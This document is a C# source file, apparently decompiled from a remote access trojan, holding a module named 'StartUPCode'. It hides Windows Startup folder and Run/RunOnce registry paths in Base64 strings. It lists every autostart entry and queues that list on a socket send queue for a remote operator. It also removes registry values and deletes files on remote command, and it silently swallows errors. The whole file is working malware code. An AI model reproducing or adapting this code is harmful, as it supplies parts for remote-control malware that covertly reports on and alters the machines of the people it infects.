namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.IO;
    using System.Text;

    public class StartUPCode
    {
        public static void GetStartUP()
        {
            try
            {
                int num5;
                string path = Encoding.UTF8.GetString(Convert.FromBase64String("QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydFVw"));
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                FileInfo[] files = new DirectoryInfo(folderPath).GetFiles();
                FileInfo[] infoArray = new DirectoryInfo(path).GetFiles();
                RegistryKey[] keyArray = new RegistryKey[] { Registry.CurrentUser.OpenSubKey(Encoding.UTF8.GetString(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"))), Registry.CurrentUser.OpenSubKey(Encoding.UTF8.GetString(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZQ=="))), Registry.LocalMachine.OpenSubKey(Encoding.UTF8.GetString(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"))), Registry.LocalMachine.OpenSubKey(Encoding.UTF8.GetString(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZQ=="))) };
                string left = string.Empty;
                foreach (FileInfo info3 in files)
                {
                    left = left + folderPath + "|" + info3.Name + "|" + folderPath + @"\" + info3.Name + "|";
                }
                foreach (FileInfo info4 in infoArray)
                {
                    left = left + path + "|" + info4.Name + "|" + path + @"\" + info4.Name + "|";
                }
                int index = 0;
                do
                {
                    foreach (string str4 in keyArray[index].GetValueNames())
                    {
                        left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(Operators.ConcatenateObject((keyArray[index].ToString() + "|") + str4 + "|", keyArray[index].GetValue(str4)), "|")));
                    }
                    index++;
                    num5 = 3;
                }
                while (index <= num5);
                left = left.Trim();
                Socketss.ListDataSend.Add(new Data("Stu|S|" + left, null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void RemoveStartup(string Patch, string Name, string Patchs)
        {
            try
            {
                if (Patch.StartsWith(Encoding.UTF8.GetString(Convert.FromBase64String("SEtFWV9MT0NBTF9NQUNISU5F"))))
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(Patch.Replace(Encoding.UTF8.GetString(Convert.FromBase64String("SEtFWV9MT0NBTF9NQUNISU5FXA==")), ""), true);
                    key.DeleteValue(Name);
                    key.Close();
                    File.Delete(Patchs);
                }
                else if (Patch.StartsWith(Encoding.UTF8.GetString(Convert.FromBase64String("SEtFWV9DVVJSRU5UX1VTRVI="))))
                {
                    string oldValue = Encoding.UTF8.GetString(Convert.FromBase64String("SEtFWV9DVVJSRU5UX1VTRVJc"));
                    RegistryKey key2 = Registry.CurrentUser.OpenSubKey(Patch.Replace(oldValue, ""), true);
                    key2.DeleteValue(Name);
                    key2.Close();
                    File.Delete(Patchs);
                }
                else if (Patch.StartsWith("C"))
                {
                    if (Patchs.Contains("\""))
                    {
                        Patchs = Patchs.Replace("\"", "");
                    }
                    File.Delete(Patchs);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
    }
}

